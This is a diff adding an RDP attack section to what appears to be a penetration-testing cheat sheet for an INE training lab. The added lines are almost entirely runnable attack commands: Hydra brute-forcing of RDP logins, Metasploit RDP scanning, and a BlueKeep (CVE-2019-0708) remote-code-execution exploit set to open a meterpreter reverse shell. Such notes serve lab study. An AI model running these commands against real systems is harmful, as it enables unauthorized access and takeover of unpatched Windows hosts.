@@ -167,6 +167,48 @@ set SMBPass <password>
 # Launch the exploit (starts a session)
 exploit
 ```
+
+# --- RDP Brute Force with Hydra ---
+hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt \
+      -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt \
+      rdp://demo.ine.local -s 3333
+
+# --- Start Metasploit and search for RDP modules ---
+msfconsole -q
+
+# Inside msfconsole:
+search rdp
+
+# --- Use RDP Scanner (check if RDP is enabled on target) ---
+use auxiliary/scanner/rdp/rdp_scanner
+set RHOSTS demo.ine.local
+run
+
+# --- Optional: Scan for BlueKeep (CVE-2019-0708) vulnerability ---
+use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
+set RHOSTS demo.ine.local
+run
+
+# --- Optional: Exploit BlueKeep (RCE) ---
+use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+set RHOSTS demo.ine.local
+set RPORT 3389
+set TARGET 1
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST <your-ip>
+set LPORT 4444
+exploit
+
+# --- Optional: Connect with xfreerdp if you found valid credentials ---
+xfreerdp /u:<user> /p:<password> /v:demo.ine.local:3333
+
+# --- Notes ---
+# - Hydra attempts brute-force RDP login using username/password lists.
+# - 'rdp_scanner' checks for RDP service availability (no auth needed).
+# - BlueKeep exploit works on unpatched Windows 7/Server 2008 R2.
+# - xfreerdp allows manual login testing (for Linux users).
+
+
 ## Directory Discovery with Gobuster
 
 | Description             | Command                                                                 |
